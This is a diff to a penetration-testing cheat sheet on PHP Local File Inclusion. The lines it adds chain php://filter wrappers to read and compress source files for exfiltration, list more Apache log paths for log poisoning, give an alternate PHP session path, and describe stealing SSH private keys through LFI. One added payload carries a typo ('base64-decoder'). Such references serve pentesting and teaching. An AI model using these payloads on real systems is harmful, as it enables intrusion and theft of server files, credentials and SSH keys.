@@ -133,7 +133,9 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained multiple times : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+NOTE: Wrappers can be chained multiple times using `|` or `/`: 
+- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
+- deflate then base64encode (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
 
 ```powershell
 ./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
@@ -287,6 +289,8 @@ Just append your PHP code into the log file by doing a request to the service (A
 ```powershell
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/apache2/access.log
+http://example.com/index.php?page=/var/log/apache2/error.log
 http://example.com/index.php?page=/var/log/nginx/access.log
 http://example.com/index.php?page=/var/log/nginx/error.log
 http://example.com/index.php?page=/var/log/vsftpd.log
@@ -349,7 +353,7 @@ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
 
-In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files
+In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
 
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
@@ -393,6 +397,9 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 
 Then crack the hashes inside in order to login via SSH on the machine.
 
+Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
+If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
+
 ## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
@@ -407,6 +414,5 @@ Then crack the hashes inside in order to login via SSH on the machine.
 * [Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)
 * [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
-* [Local file inclusion mini list - Penetrate.io](https://penetrate.io/2014/09/25/local-file-inclusion-mini-list/)
 * [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
